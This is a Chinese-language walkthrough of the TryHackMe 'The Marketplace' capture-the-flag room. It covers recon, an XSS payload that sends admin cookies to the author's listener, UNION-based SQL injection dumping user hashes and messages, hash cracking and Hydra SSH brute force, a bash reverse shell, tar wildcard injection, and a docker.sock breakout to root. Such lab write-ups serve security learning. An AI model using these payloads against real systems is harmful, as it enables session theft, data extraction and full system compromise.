# The Marketplace
> URL : https://tryhackme.com/room/marketplace

IP : 10.10.74.8

## Recon
- 首先先掃 Port
    - `rustscan -a 10.10.74.8 -r 1-65535`
        - ![](https://i.imgur.com/THfTPBa.png)
        - 有開 22 80 32768
    - `nmap -A -p22,80,32768 10.10.74.8`
        - ![](https://i.imgur.com/DQEPjj6.png)
- 觀察首頁
    - ![](https://i.imgur.com/WZZdAkU.png)
    - 感覺滿廉價ㄉQQ
- 掃目錄
    - `python3 dirsearch.py -u http://10.10.74.8/`
        - `robots.txt`
        - `login`
        - `signup`
        - ![](https://i.imgur.com/WTfL2Io.png)
- 嘗試註冊
    - ![](https://i.imgur.com/kyz3rGk.png)
    - `meow` / `meow` 
- 嘗試貼文
    - ![](https://i.imgur.com/8ivNagm.png)
    - 發現下面說不能PO檔案，感覺有埋梗
        - ![](https://i.imgur.com/NBrphH9.png)
    - 用 F12 把 disable 拔掉再測
        - ![](https://i.imgur.com/5IWEXkh.png)
- 觀察 `robots.txt`
    - ![](https://i.imgur.com/qs3uPFx.png)
- 觀察 Session
    - ![](https://i.imgur.com/6aKjy8x.png)
    - 看起來很 Base64
        - `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoibWVvdyIsImFkbWluIjpmYWxzZSwiaWF0IjoxNjI5MDk5NDQwfQ.6MNSd_Wf1ytqceTjhWWGEbB4AhzTHFshHCLIeVF_Zeo`
        - 解碼後看起來是 JWT
            - `{"alg":"HS256","typ":"JWT"}{"userId":4,"username":"meow","admin":false,"iat":1629099440}5'YrN8VXa!1Ų,^`

## XSS
- 發現 Po 文處可以 XSS
    - ![](https://i.imgur.com/LVtMQ7d.png)
- 寫 Payload 偷餅乾
    - `<script>new Image().src="http://10.13.21.55:1234/"+document.cookie</script>`
    - ![](https://i.imgur.com/h6njKX1.png)
- 回報給管理員
    - ![](https://i.imgur.com/qrvN6r7.png)
- 用 `nc -l 1234` 來接
    - ![](https://i.imgur.com/mJaHJvK.png)
    - 收到管理員的餅乾
        - `GET /token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MjkxMDAxOTN9.f-eVVqF1AnFJEeuam97hn-Xz3fFNbQAJYTKrsDukzrU HTTP/1.1`

- 使用管理員帳號登入
    - 把自己的餅乾換成管理員的
        - ![](https://i.imgur.com/ISy8k0G.png)
    - 首頁
        - ![](https://i.imgur.com/1XSphjU.png)
    - 取得 Flag1
        - `THM{c37a63895910e478f28669b048c348d5}`

## SQLi
- 發現看使用者這邊可以用 SQL injection
    - ![](https://i.imgur.com/17Bjunz.png)
- 點進去之後，透過 F12 複製成 curl 再轉 python 的 request
    - ![](https://i.imgur.com/Z9wlSre.png)
    - 測了一陣子發現空白要用 `/**/` 來繞
        - `"-1/**/UNION/**/SELECT/**/1,2,3,4/**/--")`

- 爆 db
    - `p = "-1 UNION SELECT 1,group_concat(schema_name),3,4 FROM information_schema.schemata  --"`
    - ![](https://i.imgur.com/bSvyH76.png)
    - 兩個 DB
        - `information_schema`
        - `marketplace`
            - 先關注這個
- 爆 table
    - `p = "-1 UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables where table_schema='marketplace'  --"`
    - ![](https://i.imgur.com/L8MCiSc.png)
    - 發現有三張 table
        - `items`
        - `messages`
        - `users`
- 爆 column
    - `p = "-1 UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns where table_schema='marketplace'  --"`
    - ![](https://i.imgur.com/A3Y7nW8.png)
    - `id,author,title,description,image,id,user_from,user_to,message_content,is_read,id,username,password,isAdministrator`
        - 應該需要觀察的是 `username` 跟 `password`
- 選帳號
    - `p = "-1 UNION SELECT 1,group_concat(username),3,4 FROM marketplace.users  --"`
    - `jake,meow,michael,system `
    - ![](https://i.imgur.com/b6XfCbO.png)
- 選密碼
    - `p = "-1 UNION SELECT 1,group_concat(password),3,4 FROM marketplace.users  --"`
    - ![](https://i.imgur.com/WfBQ3kh.png)
    - 看起來有過 hash
    - 把他大致整理一下
    ``` 
    $2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW,
    $2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q
    $2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG
    $2b$10$FStzuEGFk9JpOnigl2gbEuE2rRp27psGUS0UuztTtxbZPFW/Wtn4m
    ```
    - 查詢發現是 bcrypt
        - https://bcrypt-generator.com/
        - 而且可以測試其中一個是我自己註冊的 `meow`
        - ![](https://i.imgur.com/jhHGnDb.png)
- 爆密碼
    - `john password_hash.txt --wordlist=/opt/rockyou.txt`
    - `hashcat -m 3200 password_hash.txt rockyou.txt`
        - ![](https://i.imgur.com/y5YqjAf.png)
        - ![](https://i.imgur.com/ywGcdes.png)
            - 中研院超級電腦的兩張 V100 吃滿要跑 3 小時，不太合理

- 繼續 SQLi
    - `p = "-1 UNION SELECT 1,group_concat(message_content),3,4 FROM marketplace.messages --"`
    - 噴出以下內容
    ```
     User Hello!
    An automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password.
    Your new password is: @b_ENXkGYUCAv3zJ,&lt;script&gt;alert(1)&lt;/script&gt;,Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace!,Thank you for your report. We have been unable to review the listing at this time. Something may be blocking our ability to view it, such as alert boxes, which are blocked in our employee&#39;s browsers.,Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace!,Thank you for your report. We have been unable to review the listing at this time. Something may be blocking our ability to view it, such as alert boxes, which are blocked in our employee&#39;s browsers.,Thank you for your repor 
    ```
    - 看到一段看起來很像密碼的東西
        - `@b_ENXkGYUCAv3zJ`

## SSH
- 我們有 3 個 user
    - `jake`
    - `michael`
    - `system` 
- 雖然可以徒手戳一下就好，但我今天想用 Hydra
    - `hydra -L user.txt -P password.txt ssh://10.10.74.8`
    - ![](https://i.imgur.com/0vy8paN.png)
        - 噴出的結果是 jake
            - `jake` : `@b_ENXkGYUCAv3zJ`
- SSH 登入成功
    - ![](https://i.imgur.com/pPnT6TI.png)
    - 取得 user key
        - THM{c3648ee7af1369676e3e4b15da6dc0b4}
## 提權
- 起手式先 `sudo -l` 一波
    - ![](https://i.imgur.com/kPbupbL.png)
    - 看起來是很老梗的 sudo 備份 ㄇ
        - 如果是的話我們只要戳個 Reverse shell
            -  `echo "bash -c 'bash -i >& /dev/tcp/10.13.21.55/7877 0>&1'" >> /opt/backups/backup.sh`
        -  就可以打完收工ㄌ
    -  但前題是我們需要有權限修改這個 sh
        -  ![](https://i.imgur.com/r7W7QKx.png)
            -  看樣子不行QQ，我們不是賣口 QQ
- 準備 Linpeas
    - `wget 10.13.21.55:8000/linpeas.sh`
    - 發現 sudo version 1.8.21p2
        - https://www.exploit-db.com/exploits/47502
        - 但看起來不好用
    - 發現一包 backup 檔案
        - ![](https://i.imgur.com/b7pkxQY.png)
        - 用 nc 傳出來
            - `nc -l 1234 > backup.tar`
            - `cat backup.tar > /dev/tcp/10.13.21.55/1234`
            - 發現裡面都空ㄉ
                - ㄍ騙我
                - ![](https://i.imgur.com/ujraWYL.png)
- 回想起 `backup.sh` 他後面接了一個 `*`
    - 這個時候可以套用 `tar-wildcard-injection`
        - ref : https://mqt.gitbook.io/oscp-notes/tar-wildcard-injection
        - 簡單來說 tar 會把後面的 * 的東西直接串起來當指令執行
    - `echo a > '--checkpoint=1'`
    - `echo a > '--checkpoint-action=exec=sh script.sh'`
    - echo whoami > script.sh
    - ![](https://i.imgur.com/iJOCoN4.png)
    - 用 賣口權限執行
        - `sudo -u michael /opt/backups/backup.sh`
        - 發現可以成功!!!
        - ![](https://i.imgur.com/bdQQ18p.png)
- 切換到賣口
    - `echo bash > script.sh`
    - ![](https://i.imgur.com/iVUL3es.png)
## 二次提權
- 再一次 Linpeas
    - ![](https://i.imgur.com/f2G9B5Q.png)
- 發現 `/var/run/docker.sock` 可以寫入
    - ![](https://i.imgur.com/efcmkQI.png)
    - 直接給我們 Exploit 教學ㄌ，好棒
        - https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket
- 觀察目前有使用的 docker image
    - ![](https://i.imgur.com/iEs6uIO.png)
- 修改一下 image 的名字，使用 hacktricks 上面的 exploit 教學
    - `docker -H unix:///var/run/docker.sock run -v /:/host -it nginx chroot /host /bin/bash`
    - `docker -H unix:///var/run/docker.sock run -it --privileged --pid=host nginx nsenter -t 1 -m -u -n -i sh`
        - 創建 privileged 康天呢
- 提權成功
    - ![](https://i.imgur.com/SNmNk2S.png)
